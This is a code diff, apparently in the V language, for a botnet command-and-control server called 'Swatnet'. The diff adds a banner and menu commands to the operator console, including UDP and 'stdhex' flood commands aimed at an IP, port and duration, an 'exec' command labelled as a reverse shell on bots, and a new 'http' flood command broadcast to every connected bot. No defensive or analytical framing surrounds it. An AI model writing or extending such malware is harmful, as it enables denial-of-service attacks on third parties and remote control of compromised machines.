@@ -78,14 +78,21 @@ pub fn (mut s Swatnet) auth(mut client net.TcpConn) {
 
 pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 	mut reader := io.new_buffered_reader(reader: client)
+	client.write_string("╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
 	for {
 		client.write_string(">>> ") or { 0 }
 		data := reader.read_line() or { "" }
 		fcmd, cmd, args := s.bot.parse_buffer(data)
 		if data.len > 2 {
 			match cmd {
+				"home" {
+					client.write_string("╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
+				}
 				"help" {
-					client.write_string("Working\r\n") or { 0 }
+					client.write_string("home | Dashboard\r\nhelp | List of commands\r\nbots | List Of Bots\r\ncls | Clear Screen\r\nudpplain | udpplain <ip> <port> <time>\r\nstdhex <ip> <port <time>\r\nexec | Reverse Shell [BOTS]\r\n") or { 0 }
+				}
+				"cls" {
+					client.write_string("\033[2J\033[1;1H╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
 				}
 				"bots" {
 					client.write_string("Bots: ${s.bot.nickname.len}\r\n#######################################\r\n") or { 0 }
@@ -105,6 +112,13 @@ pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
 						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: udp <ip> <port> <time>\r\n") or { 0 }
 					} else {
 						s.bot.broadcast_cmd("stdhex ${args[1]} ${args[2]} ${args[3]}")
+					}
+				}
+				"http" {
+					if args.len < 3 {
+						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: udp <ip> <port> <time>\r\n") or { 0 }
+					} else {
+						s.bot.broadcast_cmd("http ${args[1]} ${args[2]}")
 					}
 				}
 				"exec" {
